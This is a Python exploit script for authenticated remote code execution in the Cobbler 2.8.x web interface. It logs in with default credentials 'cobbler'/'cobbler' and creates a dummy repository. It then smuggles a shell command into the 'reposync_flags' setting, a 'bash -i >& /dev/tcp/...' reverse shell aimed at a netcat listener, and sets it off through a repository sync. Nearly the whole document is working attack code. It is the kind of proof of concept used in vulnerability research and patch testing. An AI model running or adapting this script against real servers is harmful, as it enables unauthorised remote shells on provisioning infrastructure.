#!/usr/bin/python

"""
# Exploit title: Cobbler 2.8.x Authenticated RCE.
# Author: Dolev Farhi
# Date: 03-16-2017
# Vendor homepage: cobbler.github.io
# Software version: v.2.5.160805


Software Description
=====================
Cobbler is a Linux installation server that allows for rapid setup of network installation environments. It glues together and automates many associated Linux tasks so you do not have to hop between many various commands and applications when deploying new systems, and, in some cases, changing existing ones.
Cobbler can help with provisioning, managing DNS and DHCP, package updates, power management, configuration management orchestration, and much more.

Vulnerability Description
=========================
Authenticated RCE

"""
 
import uuid
import sys
import requests


# Custom variables
cobbler_server = 'http://192.168.2.235/cobbler_web/' 
cobbler_user = 'cobbler'
cobbler_pass = 'cobbler'
netcat_listener = '192.168.2.51/4444'


# Cobbler variables
cobbler_url = '%s/do_login' % cobbler_server
cobbler_settings_url = '%s/setting/save' % cobbler_server
cobbler_reposync = '%s/reposync' % cobbler_server
cobbler_reposave = '%s/repo/save' % cobbler_server
cobbler_repo_name = str(uuid.uuid4()).split('-')[0]



class Cobbler():
    def __init__(self):
        self.client = requests.session()
        self.client.get('%s' % cobbler_server)
        self.csrftoken = self.client.cookies['csrftoken']
        self.headers = dict(Referer=cobbler_url)
        self.login_data = dict(csrfmiddlewaretoken=self.csrftoken, next='/cobbler_web', username=cobbler_user, password=cobbler_pass)
        self.client.post(cobbler_url, data=self.login_data, headers=self.headers)

    def create_repo(self):
        print("Creating dummy repository...")
        self.repoinfo = dict(
            csrfmiddlewaretoken=self.csrftoken, 
            editmode='new', 
            subobject='False', 
            submit='Save', 
            arch='i386', 
            breed='yum', 
            comment='', 
            keep_updated='', 
            mirror='', 
            name=cobbler_repo_name, 
            owners='admin',
            rpm_list='',
            proxy='',
            apt_components='',
            apt_dists='',
            createrepo_flags='',
            environment='',
            mirror_locally='',
            priority='99',
            yumopts='')
        self.client.post(cobbler_reposave, data=self.repoinfo, headers=self.headers)

    def post_payload(self):
        print("Configuring reposync flags with the payload...")
        self.payload = dict(csrfmiddlewaretoken=self.csrftoken, editmode='edit', subobject='False', submit='Save', name='reposync_flags', value='-h; bash -i >& /dev/tcp/%s 0>&1 &' % netcat_listener)
        self.client.post(cobbler_settings_url, data=self.payload, headers=self.headers)

    def get_shell(self):
        self.create_repo()
        self.post_payload()
        print("Executing repository sync... expecting reverse shell. this may take a few seconds.")
        self.client.post(cobbler_reposync, data={'csrfmiddlewaretoken':self.csrftoken}, headers=self.headers)

if __name__ == '__main__':
    cobbler = Cobbler()
    cobbler.get_shell()
    sys.exit()